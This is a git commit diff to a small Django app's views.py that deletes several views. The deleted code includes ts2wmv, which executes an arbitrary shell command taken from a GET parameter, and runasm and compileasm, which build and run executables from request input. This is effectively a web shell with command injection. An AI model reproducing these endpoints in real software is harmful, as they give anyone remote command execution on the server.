ce0eaf24d3eef6065410d6d82f6f3996d201c8d3
slrc1 <info@slrc1.comli.com>
2016-09-28 18:19:03 +0530

    Update views.py

--- hello/views.py
+++ hello/views.py
@@ -1,9 +1,7 @@
 from django.shortcuts import render
 from django.http import HttpResponse
 import os,sys,commands,urllib
-from .models import Greeting
 
-# Create your views here.
 def index(request):
     s = None
     try:
@@ -20,33 +18,3 @@ def save(request):
     f.write('Longitude: '+lng+'\n')
     f.close()
     return HttpResponse("$")
-def compileasm(request):
-    d = str(request.GET['data'])
-    os.system('chmod a+x fasm/fasm')
-    with open('fasm/file.asm','w') as f:
-        f.write(d)
-    return HttpResponse(commands.getoutput('fasm/fasm fasm/file.asm'))
-
-def runasm(request):
-    fn = str(request.GET['file'])
-    os.system('chmod a+x fasm/'+fn)
-    return HttpResponse(commands.getoutput('fasm/'+fn))
-
-def ts2wmv(request):
-    ret = urllib.urlopen (request.GET['in']).read()
-    f = open('tmp.ts','wb')
-    f.write(ret)
-    del ret
-    f.close()
-    ret = commands.getoutput(request.GET['c'])
-    return HttpResponse(ret)
-
-def db(request):
-
-    greeting = Greeting()
-    greeting.save()
-
-    greetings = Greeting.objects.all()
-
-    return render(request, 'db.html', {'greetings': greetings})
-    
